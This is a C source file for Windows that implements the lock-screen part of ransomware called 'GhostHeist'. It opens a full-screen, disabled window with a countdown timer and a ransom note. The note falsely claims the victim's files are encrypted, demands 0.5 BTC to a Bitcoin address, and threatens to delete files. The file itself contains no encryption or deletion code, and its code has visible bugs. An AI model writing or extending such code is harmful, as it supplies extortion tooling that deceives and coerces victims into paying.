#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>

int iHour = 0;
int iMinute = 0;
int iSecond = 6;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_DESTROY: {
            PostQuitMessage(0);
        }
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            const COLORREF rgbBlack = 0x00000000;
            const COLORREF rgbRed = 0x000000FF;
            HBRUSH hbrColor = CreateSolidBrush(rgbBlack);
            FillRect(hdc, &ps.rcPaint, hbrColor);

            SetTextColor(hdc, rgbRed);
            SetBkMode(hdc, OPAQUE);
            SetBkColor(hdc, rgbBlack);

            LOGFONT lfTitle = { 0 };
            lfTitle.lfHeight = 50;
            lfTitle.lfWeight = FW_BOLD;
            HFONT hFontTitle = CreateFontIndirect(&lfTitle);
            HFONT hOldFontTitle = (HFONT)SelectObject(hdc, hFontTitle);

            LPCSTR lpTitle = "GhostHeist";
            RECT rectTitle = { 50, 50, 500, 100 };
            DrawTextA(hdc, lpTitle, -1, &rectTitle, DT_LEFT);

            SelectObject(hdc, hOldFontTitle);
            DeleteObject(hFontTitle);

            LPCSTR lpIntroduction = "You have been infected by the GhostHeist ransomware.";
            RECT rectIntroduction = { 50, rectTitle.bottom, 800, rectTitle.bottom + 50 };
            DrawTextA(hdc, lpIntroduction, -1, &rectIntroduction, DT_LEFT);

            LOGFONT lfCounter = { 0 };
            lfCounter.lfHeight = 100;
            HFONT hFontCounter = CreateFontIndirect(&lfCounter);
            HFONT hOldFontCounter = (HFONT)SelectObject(hdc, hFontCounter);

            RECT rectCounter = { 50, 200, 400, 300 };

            char cCounter[256];
            char lpHour[16] = { 0 };
            char lpMinute[16] = { 0 };
            char lpSecond[16] = { 0 };

            _itoa(iHour, &lpHour, 10);
            _itoa(iMinute, &lpMinute, 10);
            _itoa(iSecond, &lpSecond, 10);
            sprintf(cCounter, "%02s:%02s:%02s", lpHour, lpMinute, lpSecond);

            DrawTextA(hdc, cCounter, -1, &rectCounter, DT_BOTTOM);

            SelectObject(hdc, hOldFontCounter);
            DeleteObject(hFontCounter);

            LPCSTR lpMessage = 
                "All your files have been encrypted including your pictures, documents, videos.\n"
                "You have 24:00 hours to pay. Every 10 minutes one 1 file will be deleted.\n"
                "Any attempt to recover them will result to a total deletion.\n"
                "If you want to see all your files back send 0.5 BTC at this address:\n";
            RECT rectMessage = { 50, rectCounter.bottom + 100, 1000, rectCounter.bottom + 200 };
            DrawTextA(hdc, lpMessage, -1, &rectMessage, DT_LEFT);

            const COLORREF rgbWhite = 0x00FFFFFF;
            SetTextColor(hdc, rgbBlack);
            SetBkMode(hdc, OPAQUE);
            SetBkColor(hdc, rgbWhite);
            LPCSTR lpAddress = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
            RECT rectAddress = { 50, rectMessage.bottom, 500, rectMessage.bottom + 50 };
            DrawTextA(hdc, lpAddress, -1, &rectAddress, DT_LEFT);

            if (iHour == 0 && iMinute == 0 &iSecond == 0) {
                FillRect(hdc, &ps.rcPaint, hbrColor);

                SetTextColor(hdc, rgbRed);
                SetBkMode(hdc, OPAQUE);
                SetBkColor(hdc, rgbBlack);
                LPCSTR lpDestroy =
                    "Ransom was not paid.\n"
                    "Deleting every files on the computer.\n"
                    "See you next time...";
                RECT rectDestory = { 50, 50, 1000, 100 };
                DrawTextA(hdc, lpDestroy, -1, &rectDestory, DT_LEFT);
            }

            EndPaint(hwnd, &ps);
        }
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
	const wchar_t CLASS_NAME[] = L"Ghost Class";

	WNDCLASS wc = {0};

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;

	RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        WS_EX_WINDOWEDGE,                             
        CLASS_NAME,                     
        L"ghostRansom",   
        //Option 1 for full size mode
        //Option 2 for dev mode
        WS_MAXIMIZE | WS_DISABLED | WS_POPUP | WS_VISIBLE,
        //WS_BORDER | WS_SYSMENU, // We use this one only for debugging
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL,         
        NULL,       
        hInstance,  
        NULL       
    );

    if (hwnd == NULL) {
        printf("CreateWindow failed with error: 0x%x\n", GetLastError());
        return 1;
    }

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    for (iHour; iHour >= 0; iHour--) {
        for (iMinute; iMinute >= 0; iMinute--) {
            for (iSecond; iSecond >= 0; iSecond--) {
                InvalidateRect(hwnd, NULL, TRUE);
                UpdateWindow(hwnd);

                MSG msg;
                while (PeekMessage(&msg, hwnd, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                Sleep(1000);
            }
            iSecond = 59;
        }
        iMinute = 59;
    }
}
